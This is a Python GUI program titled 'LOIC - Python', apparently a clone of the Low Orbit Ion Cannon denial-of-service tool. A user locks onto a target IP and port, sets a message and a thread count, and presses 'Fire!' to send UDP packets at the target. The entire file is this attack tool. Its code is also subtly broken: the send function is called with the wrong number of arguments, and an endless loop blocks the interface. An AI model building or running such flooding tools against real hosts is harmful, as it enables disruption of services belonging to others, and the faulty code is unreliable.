import socket
import _thread

try:
    import tkinter as tk  # for python 3
except:
    import Tkinter as tk  # for python 2
import pygubu
import time
from threading import Thread


def wait(Thread, delay):
    time.sleep(delay)


def sendudp(ip_address, port, message):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # UDP
        sock.sendto(bytes(message, "utf-8"), (ip_address, port))
    except:
        print("Error sending UDP")


class Application:
    def __init__(self, master):
        # 1: Create a builder
        self.builder = builder = pygubu.Builder()

        # 2: Load an ui file
        builder.add_from_file('python_stress_gui.ui')

        # 3: Create the widget using a master as parent
        self.mainwindow = builder.get_object('frame_main', master)

        builder.connect_callbacks(self)

        callbacks = {
            'on_button_lock_url_clicked': self.on_button_lock_url_clicked,
            'on_button_lock_ip_address_clicked': self.on_button_lock_ip_address_clicked,
            'on_button_ready_clicked': self.on_button_ready_clicked,
        }

        builder.connect_callbacks(callbacks)

    def on_button_lock_url_clicked(self):
        pass

    def on_button_lock_ip_address_clicked(self):
        entry_ip_address = self.builder.get_object('entry_ip_address')
        button_lock_ip_address = self.builder.get_object('button_lock_ip_address')

        button_lock_url = self.builder.get_object('button_lock_url')
        entry_url = self.builder.get_object('entry_url')

        selected_target_label_value = self.builder.get_object('label_selected_target_value')

        if str(entry_ip_address.cget('state')) == 'normal':
            entry_ip_address.configure(state='disabled')
            button_lock_ip_address.configure(text='Unlock')

            entry_url.configure(state='disabled')
            button_lock_url.configure(text='Blocked', state='disabled')

            selected_target_label_value.configure(text=str(entry_ip_address.get()))

        else:
            entry_ip_address.configure(state='normal')
            button_lock_ip_address.configure(text='Lock on')

            entry_url.configure(state='normal')
            button_lock_url.configure(text='Lock on', state='normal')

            selected_target_label_value.configure(text='None selected')

    def on_button_ready_clicked(self):
        button_ready = self.builder.get_object('button_ready')

        if str(button_ready.cget('text')) == 'Fire!':
            try:

                button_ready.configure(text='Stop firing!')
                ip_address = str((self.builder.get_object('entry_ip_address')).get())
                port = int((self.builder.get_object('entry_port')).get())
                message = str((self.builder.get_object('entry_message')).get())
                label_ready = self.builder.get_object('label_ready')

                threads = int((self.builder.get_object('entry_threads')).get())

                requestsCount = 0
            except:
                print("Error setting variables ")
            for x in range(0, threads):
                try:

                        threadId = _thread.start_new_thread(sendudp, (ip_address, port, message, 2))
                        while True:
                            wait(threadId, 2)
                            print("[", threadId, "]UDP target IP:", ip_address)
                            print("[", threadId, "]UDP target port:", port)
                            print("[", threadId, "]message:", message)
                except:
                    print("Error starting thread")
        else:
            button_ready.configure(text='Fire!')


if __name__ == '__main__':
    root = tk.Tk()
    root.wm_title('LOIC - Python')
    app = Application(root)
    root.mainloop()
